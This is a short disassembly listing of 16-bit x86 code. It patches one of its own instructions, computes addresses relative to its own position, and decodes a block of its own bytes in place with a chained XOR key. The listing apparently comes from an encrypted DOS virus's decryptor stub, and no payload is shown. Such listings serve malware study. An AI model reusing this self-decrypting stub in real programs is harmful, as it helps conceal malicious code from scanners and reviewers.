19ada cf                   iret     
19add 5b                   pop      bx
19ade 2ec647fdcf           mov      byte ptr cs:[bx - 3], 0xcf
19ae3 0e                   push     cs
19ae4 0e                   push     cs
19ae5 1f                   pop      ds
19ae6 07                   pop      es
19ae7 be6c01               mov      si, 0x16c
19aea 01ee                 add      si, bp
19aec 89f7                 mov      di, si
19aee fb                   sti      
19aef fc                   cld      
19af0 81eb6f01             sub      bx, 0x16f
19af4 29eb                 sub      bx, bp
19af6 8bcb                 mov      cx, bx
19af8 b49f                 mov      ah, 0x9f
19afa ac                   lodsb    al, byte ptr [si]
19afb 30e0                 xor      al, ah
19afd 88c4                 mov      ah, al
19aff aa                   stosb    byte ptr es:[di], al
19b00 e2f8                 loop     0x19afa
19b02 58                   pop      ax
19b03 58                   pop      ax
19b04 5b                   pop      bx
19b05 32db                 xor      bl, bl
19b07 80e701               and      bh, 1
19b0a f6f7                 div      bh
